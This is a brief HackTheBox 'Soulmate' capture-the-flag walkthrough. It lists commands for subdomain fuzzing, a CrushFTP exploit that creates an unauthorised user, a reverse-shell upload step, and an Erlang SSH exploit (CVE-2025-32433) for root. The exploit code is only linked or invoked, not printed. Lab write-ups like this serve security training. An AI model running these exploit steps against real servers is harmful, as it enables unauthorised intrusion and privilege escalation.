# HackTheBox - Soulmate

**Youtube video:** https://youtu.be/OwdLAonymvQ

---

## Initial Foothold

**DNS Enumeration:**

```bash

# Fuzz for subdomains

ffuf -u http://$IP -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --fc 302

# Found: ftp.soulmate.htb (CrushFTP)

```

**Exploit:** CrushFTP Vulnerability

```bash

# After searching a little bit, we find this exploit

# Change the target URL in Burp

# Exploit CrushFTP to create new user

python3 52295.py --target ftp.soulmate.htb --exploit --new-user strikoder --password abcd1234 --port 80 --proxy http://127.0.0.1:8081

# Add upload access to app folder to any user

# Upload a reverse shell and access it

```

---

## Lateral Movement (www-data → ben)

**Process Enumeration:**

```bash

# Check running processes

ps -ef --forest | less -S

# Found Erlang process running as root:

# root        1082       1  0 13:41 ?        00:00:01 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dotl_erang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript

```

**Enumerate Erlang Script:**

```bash

# Check the escript file

cat /usr/local/lib/erlang_login/start.escript

# Switch to ben

su -u ben

```

---

## Privilege Escalation (ben → root)

**Network Enumeration:**

```bash

# Check listening ports

netstat -tunlp

# Found port 2222 running Erlang

```

**Erlang Version Check & Exploit:**

```bash

# Connect to Erlang port

nc localhost 2222

# Check version - found vulnerable version

```

**Exploit:** CVE-2025-32433 - Erlang Privilege Escalation

- **Payload:** https://github.com/strikoder/OffensiveSecurity/blob/main/CVES/CVE-2025-32433.py

```bash

# Run exploit

python3 CVE-2025-32433.py

```
